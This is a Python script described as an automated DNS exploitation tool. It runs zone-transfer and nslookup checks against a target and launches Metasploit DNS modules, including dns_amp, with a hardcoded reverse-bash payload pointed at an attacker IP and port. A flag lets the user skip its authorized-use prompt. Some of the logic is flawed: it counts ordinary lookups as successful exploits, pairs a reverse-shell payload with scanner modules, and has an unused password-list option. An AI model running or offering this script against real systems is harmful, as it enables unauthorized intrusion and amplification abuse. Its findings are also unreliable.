#!/usr/bin/env python3
import json
import subprocess
import argparse
import time
import re
from pathlib import Path
from typing import Dict, List, Tuple
import sys
import logging
import shutil

# Setup logging
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger(__name__)

# Constants
OUTPUT_DIR = Path("outputs")
EXPLOIT_JSON = "{target}_dns_exploit.json"
EXPLOIT_MD = "{target}_dns_exploit.md"

def run_command(cmd: List[str], timeout: int = 1500, shell: bool = False) -> Tuple[str, bool]:
    """Run a shell command and return its output and success status."""
    cmd_str = cmd if isinstance(cmd, str) else " ".join(cmd)
    logger.info(f"Running: {cmd_str}")
    try:
        result = subprocess.run(
            cmd,
            shell=shell,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            timeout=timeout
        )
        return result.stdout.strip(), True
    except subprocess.CalledProcessError as e:
        logger.error(f"Command failed: {cmd_str} - {e.output}")
        return e.output, False
    except subprocess.TimeoutExpired:
        logger.error(f"Command timed out: {cmd_str}")
        return "Command timed out", False
    except Exception as e:
        logger.error(f"Error running command: {cmd_str} - {e}")
        return str(e), False

def run_metasploit_exploit(module: str, rhost: str, rport: str, payload: str, attacker_ip: str, attacker_port: str) -> Tuple[bool, str]:
    """Run a Metasploit exploit module."""
    payload = "cmd/unix/reverse_bash"
    
    msf_cmd = [
        "msfconsole", "-q", "-x",
        f"use {module}; set RHOSTS {rhost}; set RPORT {rport}; set LHOST {attacker_ip}; set LPORT {attacker_port}; set PAYLOAD {payload}; run; exit"
    ]
    output, success = run_command(msf_cmd, timeout=600)
    poc = f"msfconsole -q -x 'use {module}; set RHOSTS {rhost}; set RPORT {rport}; set LHOST {attacker_ip}; set LPORT {attacker_port}; set PAYLOAD {payload}; run'"
    if success and ("Meterpreter session" in output or "Shell session" in output or "Command shell session" in output):
        logger.info(f"Success: {module} exploited! Check listener.")
        return True, poc
    logger.error(f"Failed: {module} did not exploit.")
    return False, poc

def test_dns_zone_transfer(target: str, port: str) -> Tuple[bool, str]:
    """Test DNS zone transfer."""
    dig_cmd = f"dig @{target} AXFR"
    output, success = run_command(dig_cmd, timeout=300, shell=True)
    if success and "SOA" in output and "NS" in output:
        logger.info(f"DNS zone transfer successful for {target}")
        poc = f"dig @{target} AXFR"
        return True, poc
    return False, ""

def test_dns_enumeration(target: str, port: str) -> Tuple[bool, str]:
    """Test DNS enumeration."""
    enum_cmd = f"nslookup -type=any {target}"
    output, success = run_command(enum_cmd, timeout=300, shell=True)
    if success and "Name:" in output:
        logger.info(f"DNS enumeration successful for {target}")
        poc = f"nslookup -type=any {target}"
        return True, poc
    return False, ""

def test_dns_reverse_lookup(target: str, port: str) -> Tuple[bool, str]:
    """Test DNS reverse lookup."""
    reverse_cmd = f"nslookup {target}"
    output, success = run_command(reverse_cmd, timeout=300, shell=True)
    if success and "Name:" in output:
        logger.info(f"DNS reverse lookup successful for {target}")
        poc = f"nslookup {target}"
        return True, poc
    return False, ""

def save_exploit_report(exploits: List[Dict], target: str, port: str) -> None:
    """Save exploit report to JSON and Markdown."""
    json_path = OUTPUT_DIR / EXPLOIT_JSON.format(target=target)
    md_path = OUTPUT_DIR / EXPLOIT_MD.format(target=target)
    metadata = {"target": target, "port": port, "successful_exploits": exploits}
    
    # Save JSON
    with json_path.open("w", encoding='utf-8') as f:
        json.dump(metadata, f, indent=2)
    logger.info(f"Saved exploit JSON to {json_path}")
    
    # Save Markdown
    lines = [f"# DNS Exploit Report for {target}:{port}\n"]
    lines.append(f"Generated: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n")
    
    # Filter out non-exploit entries
    actual_exploits = [exp for exp in exploits if 'type' in exp]
    failed_attempts = [exp for exp in exploits if 'failed_attempts' in exp]
    
    for exploit in actual_exploits:
        lines.append(f"## {exploit['type']}\n")
        if 'url' in exploit:
            lines.append(f"- **URL**: {exploit['url']}\n")
        elif 'target' in exploit:
            lines.append(f"- **Target**: {exploit['target']}\n")
        lines.append(f"- **Details**: {exploit['details']}\n")
        lines.append(f"- **PoC**: `{exploit['poc']}`\n\n")
        if "shell_paths" in exploit:
            lines.append("### Shell Paths\n")
            for path in exploit["shell_paths"]:
                lines.append(f"- {path}\n")
    
    if failed_attempts:
        lines.append("## Failed Attempts\n")
        for failed in failed_attempts:
            for attempt in failed.get("failed_attempts", []):
                lines.append(f"- {attempt}\n")
    
    with md_path.open("w", encoding='utf-8') as f:
        f.write("\n".join(lines))
    logger.info(f"Saved exploit Markdown to {md_path}")

def exploit_target(metadata: Dict, target: str, port: str, attacker_ip: str, attacker_port: str, use_rockyou: bool) -> List[Dict]:
    """Exploit DNS vulnerabilities."""
    success = False
    exploits = []
    failed_attempts = []

    logger.info(f"Starting DNS exploitation on {target}:{port}")

    # Test DNS zone transfer
    zone_success, zone_poc = test_dns_zone_transfer(target, port)
    if zone_success:
        success = True
        exploits.append({
            "type": "DNS Zone Transfer",
            "target": f"{target}:{port}",
            "details": "DNS zone transfer vulnerability found",
            "poc": zone_poc
        })
    else:
        failed_attempts.append(f"DNS zone transfer on {target}:{port}")

    # Test DNS enumeration
    enum_success, enum_poc = test_dns_enumeration(target, port)
    if enum_success:
        success = True
        exploits.append({
            "type": "DNS Enumeration",
            "target": f"{target}:{port}",
            "details": "DNS enumeration successful",
            "poc": enum_poc
        })
    else:
        failed_attempts.append(f"DNS enumeration on {target}:{port}")

    # Test DNS reverse lookup
    reverse_success, reverse_poc = test_dns_reverse_lookup(target, port)
    if reverse_success:
        success = True
        exploits.append({
            "type": "DNS Reverse Lookup",
            "target": f"{target}:{port}",
            "details": "DNS reverse lookup successful",
            "poc": reverse_poc
        })
    else:
        failed_attempts.append(f"DNS reverse lookup on {target}:{port}")

    # Test Metasploit DNS exploits
    logger.info("Checking Metasploit DNS exploits...")
    dns_modules = [
        "auxiliary/scanner/dns/dns_amp",
        "auxiliary/scanner/dns/dns_zone_transfer"
    ]
    
    for module in dns_modules:
        msf_success, msf_poc = run_metasploit_exploit(module, target, port, "", attacker_ip, attacker_port)
        if msf_success:
            success = True
            exploits.append({
                "type": "Metasploit DNS Exploit",
                "target": f"{target}:{port}",
                "details": f"Module {module} exploited",
                "poc": msf_poc
            })
        else:
            failed_attempts.append(f"Metasploit module {module} on {target}:{port}")

    exploits.append({"shell_paths": [], "failed_attempts": failed_attempts})

    if not success:
        logger.error("No DNS vulnerabilities successfully exploited.")
    else:
        logger.info("DNS exploitation completed successfully.")

    return exploits

def find_metadata_file(target: str) -> Tuple[Path, str]:
    """Find the first DNS metadata file for the target and extract port."""
    metadata_files = list(OUTPUT_DIR.glob(f"{target}_domain_*_metadata.json"))
    if not metadata_files:
        logger.error(f"No DNS metadata files found for {target}.")
        return None, ""
    
    metadata_file = metadata_files[0]
    logger.info(f"Found metadata file: {metadata_file}")
    
    try:
        with metadata_file.open("r", encoding='utf-8') as f:
            metadata = json.load(f)
        port = metadata.get("port", "53")
        logger.info(f"Using port {port} from metadata")
        return metadata_file, port
    except json.JSONDecodeError as e:
        logger.error(f"Error decoding {metadata_file}: {e}")
        port = "53"
        logger.info(f"Falling back to default port {port}")
        return metadata_file, port
    except Exception as e:
        logger.error(f"Error reading {metadata_file}: {e}")
        return None, ""

def main():
    """Main function to parse arguments and run exploits."""
    parser = argparse.ArgumentParser(description="Automated DNS exploitation script")
    parser.add_argument("target", help="Target domain or IP")
    parser.add_argument("--attacker-ip", required=True, help="Attacker IP for reverse shells")
    parser.add_argument("--attacker-port", default="4444", help="Attacker port for reverse shells")
    parser.add_argument("--use-rockyou", action="store_true", help="Use rockyou.txt for brute-forcing")
    parser.add_argument("--no-confirm", action="store_true", help="Skip user confirmation")
    args = parser.parse_args()

    # Legal warning
    if not args.no_confirm:
        logger.warning("This script is for authorized penetration testing only.")
        confirm = input("[?] Proceed? (y/n): ")
        if confirm.lower() != "y":
            logger.info("Exiting...")
            sys.exit(0)

    # Check dependencies
    logger.info("Checking dependencies...")
    for tool in ["dig", "nslookup", "msfconsole"]:
        if not shutil.which(tool):
            logger.error(f"{tool} not found. Install it.")
            sys.exit(1)

    # Find DNS metadata file
    json_path, port = find_metadata_file(args.target)
    if not json_path or not port:
        logger.error(f"Failed to find DNS metadata file for {args.target}.")
        sys.exit(1)

    # Load metadata
    try:
        with json_path.open("r", encoding='utf-8') as f:
            metadata = json.load(f)
    except json.JSONDecodeError as e:
        logger.error(f"Error decoding {json_path}: {e}")
        sys.exit(1)
    except Exception as e:
        logger.error(f"Error loading {json_path}: {e}")
        sys.exit(1)

    # Run exploits
    logger.info(f"Starting exploitation for {args.target}:{port}...")
    exploits = exploit_target(metadata, args.target, port, args.attacker_ip, args.attacker_port, args.use_rockyou)

    # Save results
    save_exploit_report(exploits, args.target, port)
    logger.info("Exploitation complete.")

if __name__ == "__main__":
    main() 